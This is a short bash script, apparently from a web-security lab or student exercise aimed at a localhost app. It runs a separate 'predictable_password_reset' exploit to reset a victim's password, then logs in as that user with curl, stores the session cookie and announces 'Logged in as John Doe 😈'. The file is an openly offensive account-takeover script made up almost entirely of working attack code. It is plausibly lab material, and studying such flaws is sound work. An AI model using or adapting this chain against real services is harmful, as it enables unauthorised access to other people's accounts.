#!/usr/bin/env bash

make_blue() {
  echo -e "\033[1;94m$1\033[1;0m"
}

make_green() {
  echo -e "\033[1;92m$1\033[1;0m"
}

login_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
domain="http://localhost:4942"
hacked_joe="jdoe@student.42.tech"
password="123456"
cookie_file="$login_dir/cookie.txt"

"$login_dir/predictable_password_reset/exploit.sh" "$hacked_joe" "$password"

location=$(curl -X POST "$domain"/login \
    -s \
    -w "%{redirect_url}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "identity=$hacked_joe&password=$password" \
    -c "$cookie_file");

if [[ "$location" == "$domain/" ]]; then 
    echo "$(make_green SUCCESS!) Logged in as John Doe 😈"
else
    echo "Were not able to login as John Doe...😔"
    exit 1
fi
